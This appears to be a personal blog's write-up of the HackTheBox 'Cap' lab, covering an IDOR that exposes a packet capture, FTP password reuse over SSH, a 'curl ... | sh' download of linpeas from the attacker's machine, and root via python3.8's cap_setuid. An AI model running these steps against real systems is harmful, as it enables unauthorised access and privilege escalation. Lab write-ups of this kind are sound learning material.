@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HackTheBox — Cap Writeup — Brandon Mukeni</title>
+  <meta name="description" content="Gaining access on Cap">
+ 
+  <link rel="icon" href="/favicon-package/favicon.svg" type="image/svg+xml" sizes="any">
+  <link rel="icon" href="/favicon-package/favicon.ico">
+  <link rel="apple-touch-icon" href="/favicon-package/apple-touch-icon.png">
+  <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+  <meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
+ 
+  <link rel="stylesheet" href="/assets/css/csscopy.css">
+  <link rel="stylesheet" href="/assets/css/post.css">
+  <link rel="stylesheet" href="/assets/css/mobile_fixes.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+ 
+<body id="top">
+ 
+  <!-- NAV (matches index.html exactly) -->
+  <div class="extended-nav">
+    <div class="logo-nav">
+      <a href="/templates/bcreative_page.html" class="logo">
+        <img src="/images/logo/logo_white.png" width="100" height="20" alt="Brandon Logo" class="logo-light">
+        <img src="/images/logo/logo_teal.png"  width="100" height="20" alt="Brandon Logo" class="logo-dark">
+      </a>
+    </div>
+    <button class="header-action-btn theme-toggle" aria-label="Toggle theme" data-theme-toggler>
+      <ion-icon name="moon-outline" class="moon-icon"></ion-icon>
+      <ion-icon name="sunny-outline" class="sun-icon"></ion-icon>
+    </button>
+  </div>
+ 
+  <header class="header" data-header>
+    <div class="container">
+      <nav class="navbar" data-navbar>
+        <div class="navbar-top">
+          <a href="/templates/bcreative_page.html" class="logo">
+            <img src="/images/logo/logo_white.png" width="100" height="25" alt="Brandon Logo">
+          </a>
+          <button class="nav-close-btn" aria-label="close menu" data-nav-toggler>
+            <ion-icon name="close-outline" aria-hidden="true"></ion-icon>
+          </button>
+        </div>
+        <ul class="navbar-list">
+          <li class="navbar-item"><a href="/index.html"              class="navbar-link" data-nav-link>Home</a></li>
+          <li class="navbar-item"><a href="/templates/aboutme.html"  class="navbar-link" data-nav-link>About Me</a></li>
+          <li class="navbar-item"><a href="/templates/projects.html" class="navbar-link" data-nav-link>Projects</a></li>
+          <li class="navbar-item"><a href="/templates/writeups.html" class="navbar-link" data-nav-link>Write-ups</a></li>
+          <li class="navbar-item"><a href="/templates/contacts.html" class="navbar-link" data-nav-link>Contact</a></li>
+        </ul>
+      </nav>
+      <div class="header-action">
+        <button class="header-action-btn nav-open-btn" aria-label="menu" data-nav-toggler>
+          <ion-icon name="menu-outline" aria-hidden="true"></ion-icon>
+        </button>
+      </div>
+      <div class="overlay" data-nav-toggler data-overlay></div>
+    </div>
+  </header>
+ 
+  <main>
+    <article class="post-article">
+      <div class="container">
+ 
+        <!-- Post header -->
+        <header class="post-header">
+          <div class="post-meta">
+            <span class="post-type-badge">WRITEUP</span>
+            <time datetime="2026-08-03" class="post-date">August 03, 2026</time>
+          </div>
+          <h1 class="post-title">HackTheBox — Cap Writeup</h1>
+          <p class="post-excerpt">Gaining access on Cap</p>
+          <div class="post-divider"></div>
+        </header>
+ 
+        <!-- Post body (converted from the markdown) -->
+        <div class="post-content">
+          <h1>Cap - Writeup</h1>
+<blockquote>
+<p><strong>Platform:</strong> HackTheBox<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Date completed:</strong> 2026-08-03</p>
+</blockquote>
+<hr />
+<h1>Overview</h1>
+<p>So, I just wrapped up "Cap" on HackTheBox. Honestly, this machine is a fantastic reminder of why we shouldn't just rely on standard SUID binaries when we are looking to escalate privileges. The main learning point here revolves around web-based Insecure Direct Object References (IDOR) to sniff traffic, and then leveraging Linux Capabilities—specifically <code>cap_setuid</code>—to slide right into root. </p>
+<hr />
+<h2>Enumeration</h2>
+<p>To kick things off, I wanted to see what ports were open and running on the target. I fired up a classic, straightforward Nmap scan to check services and run default scripts:</p>
+<pre><code class="language-bash">└─$ nmap -sV -sC 10.129.45.187   
+</code></pre>
+<p>The scan returned three open ports:<br />
+* <strong>Port 21:</strong> FTP (vsftpd 3.0.3)<br />
+* <strong>Port 22:</strong> SSH (OpenSSH 8.2p1)<br />
+* <strong>Port 80:</strong> HTTP (Gunicorn running a "Security Dashboard")</p>
+<p>With HTTP open, I decided to check out the website in my browser. While poking around the dashboard, I noticed a section for PCAP files. When I clicked on it, it redirected me to a URL structure that looked like this: <code>http://10.129.45.187/data/1</code>. </p>
+<p><img alt="dashboard" src="dashboard_Screenshot 2026-07-03 124042.png" /></p>
+<p>Seeing that <code>/data/1</code> in the URL immediately made me think of IDOR (Insecure Direct Object Reference). I wondered what would happen if I started messing with that number.</p>
+<hr />
+<h2>Exploitation</h2>
+<h3>Getting User</h3>
+<p>I looked at Nathan's profile on the site, but there wasn't anything special there. My gut told me to try manipulating the ID in the URL. I decided to change the <code>1</code> to a <code>0</code> (<code>http://10.129.45.187/data/0</code>), and boom—it actually worked! </p>
+<p><img alt="using id 0 " src="id_change_Screenshot 2026-07-03 123656.png" /></p>
+<p>I saw some really juicy data on the page. Since the web page had a built-in option to download the PCAP file, and I knew there was an open FTP server on the machine, I figured this packet capture might contain some actual network traffic from someone logging in. </p>
+<p>I downloaded the file and opened it up in Wireshark. Since I was targeting FTP, I simply typed <code>ftp</code> into the display filter to see what I could find.</p>
+<p><img alt="wireshark " src="pcap_Screenshot 2026-07-03 125145.png" /></p>
+<p>And there it was! A clear-text login capture showing Nathan logging into the FTP server with the password <code>Buck3tH...0RM3!</code>. </p>
+<p>Knowing that reuse is super common, I immediately tried using those exact same credentials to SSH into the machine as <code>nathan</code>:</p>
+<pre><code class="language-bash">└─$ ssh nathan@10.129.45.187
+</code></pre>
+<p>The password worked perfectly, and I was in! From there, grabbing the user flag was a breeze:</p>
+<pre><code class="language-bash">nathan@cap:~$ ls
+user.txt
+nathan@cap:~$ cat user.txt
+0bf96f9b0.............1fb5ec94
+</code></pre>
+<hr />
+<h3>Privilege Escalation</h3>
+<p>Now it was time to find a way to get root. I'm not going to lie, privilege escalation sometimes makes me scratch my head a bit, and this run was no exception. </p>
+<p>Normally, the first three things I check are:<br />
+1. SUID binaries: <code>find / -perm -u=s -type f 2&gt;/dev/null</code><br />
+2. Running processes: <code>ps -aux</code> or <code>ss -tlnp</code></p>
+<p>I ran my usual SUID search and looked at the running processes, but I found absolutely nothing useful. I was totally stuck. </p>
+<p>Since I was playing the guided version of the lab, I decided to take a tiny peek at the hints. The hint mentioned that the privilege escalation could be done with binaries, but I still couldn't see any weird SUID files. </p>
+<p>After scratching my head for a bit, I decided to bring out the big guns: <strong>Linpeas</strong>. Linpeas is an absolute lifesaver of a tool for highlighting privilege escalation vectors you might miss with manual checks.</p>
+<p>To get it onto the target, I set up a quick Python HTTP server on my local attack machine:</p>
+<pre><code class="language-bash">─$ sudo python3 -m http.server 80
+</code></pre>
+<p>Then, on the victim machine as Nathan, I curled the script and piped it directly into bash:</p>
+<pre><code class="language-bash">nathan@cap:~$ curl 10.10.14.29/linpeas.sh | sh
+</code></pre>
+<p>Linpeas started scanning away. When I looked through the results under the <strong>Files with capabilities</strong> section, something stood out immediately:</p>
+<pre><code class="language-text">Files with capabilities (limited to 50):
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+</code></pre>
+<p>Aha! <code>/usr/bin/python3.8</code> had the <code>cap_setuid</code> capability set. </p>
+<p>For some quick context: <code>cap_setuid</code> is a Linux capability that allows a process to manipulate its own UID (User ID). This means Python could set its effective user ID to root (0) without needing the actual SUID bit to be set on the binary itself. </p>
+<p>To exploit this, I ran the Python 3.8 binary, imported the <code>os</code> module, set the UID to <code>0</code> (root), and spawned a bash shell:</p>
+<pre><code class="language-bash">nathan@cap:~$ /usr/bin/python3.8 
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.setuid(0)
+&gt;&gt;&gt; os.system('/bin/bash')
+</code></pre>
+<p>It worked beautifully. I instantly got a root shell!</p>
+<pre><code class="language-bash">root@cap:~# whoami
+root
+</code></pre>
+<p>All that was left to do was navigate to the root directory and claim the final flag:</p>
+<pre><code class="language-bash">root@cap:~# cd /root
+root@cap:/root# cat root.txt
+eb5209ffaa879963.....ecf4ad76
+</code></pre>
+<hr />
+<h2>Key Takeaways</h2>
+<ul>
+<li><strong>Look beyond SUID/SGID:</strong> This machine was a great lesson on Linux Capabilities. Even if standard SUID searches turn up empty, always check for capabilities using Linpeas or <code>getcap -r / 2&gt;/dev/null</code>.</li>
+<li><strong>Inspect Web Parameters:</strong> Simple URL parameter manipulation (<code>/data/1</code> -&gt; <code>/data/0</code>) can reveal massive information disclosures, including full packet captures of sensitive administrative traffic.</li>
+<li><strong>Don't Overlook PCAPs:</strong> If you find a PCAP file on a server, download it. Cleartext protocols like FTP, HTTP, or Telnet are goldmines for credentials.</li>
+</ul>
+<hr />
+<h2>Tools Used</h2>
+<ul>
+<li><strong>Nmap</strong> - Initial ports and service enumeration</li>
+<li><strong>Wireshark</strong> - Analyzing the downloaded PCAP file to retrieve credentials</li>
+<li><strong>Linpeas</strong> - Privilege escalation vector enumeration (identifying the Python capability)</li>
+<li><strong>Python HTTP Server</strong> - Hosting Linpeas on the attack machine</li>
+</ul>
+<hr />
+<p><em>Written by Brandon (Founder BeCreative) . 2026-08-03</em></p>
+        </div>
+ 
+        <!-- Back link -->
+        <div class="post-footer">
+          <a href="/templates/writeups.html" class="btn btn-secondary">
+            ← Back to all writeups
+          </a>
+        </div>
+ 
+      </div>
+    </article>
+  </main>
+ 
+  <!-- FOOTER (matches index.html) -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-top section grid-list">
+        <div class="footer-brand">
+          <a href="/templates/bcreative_page.html" class="logo">
+            <img src="/images/logo/logo_teal.png" width="100" height="48" alt="Brandon Logo">
+          </a>
+          <p class="footer-text">Cybersecurity student passionate about technology, security, and innovation.</p>
+        </div>
+        <ul class="footer-list">
+          <p class="footer-list-title">Connect</p>
+          <li><a href="https://github.com/muk-e-ni/"          class="footer-link"><ion-icon name="logo-github"></ion-icon> Github</a></li>
+          <li><a href="https://www.linkedin.com/in/brandon-mukeni-46276236b/" class="footer-link"><ion-icon name="logo-linkedin"></ion-icon> LinkedIn</a></li>
+          <li><a href="https://discord.com/users/1130262077957746739"         class="footer-link"><ion-icon name="logo-discord"></ion-icon> Discord</a></li>
+        </ul>
+        <ul class="footer-list">
+          <li><p class="footer-list-title">Explore</p></li>
+          <li><a href="/templates/projects.html" class="footer-link">Projects</a></li>
+          <li><a href="/templates/writeups.html" class="footer-link">Writeups</a></li>
+          <li><a href="/templates/about.html"    class="footer-link">About</a></li>
+        </ul>
+        <ul class="footer-list">
+          <li><p class="footer-list-title">Contact</p></li>
+          <li class="footer-list-item">
+            <ion-icon name="mail" aria-hidden="true"></ion-icon>
+            <a href="mailto:contact@brandonmukeni.com" class="footer-link">Email Me</a>
+          </li>
+          <li class="footer-list-item">
+            <ion-icon name="location" aria-hidden="true"></ion-icon>
+            <address class="address">Nairobi, Kenya</address>
+          </li>
+        </ul>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; 2026 Brandon Mukeni. All rights reserved.</p>
+        <p class="footer-credit">Made with love and bugs</p>
+      </div>
+    </div>
+  </footer>
+ 
+  <a href="#top" class="back-top-btn" aria-label="back to top" data-back-top-btn>
+    <ion-icon name="arrow-up-outline" aria-hidden="true"></ion-icon>
+  </a>
+ 
+  <script src="/assets/js/jscopy.js" defer></script>
+  <script src="/assets/js/theme.js"  defer></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule    src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
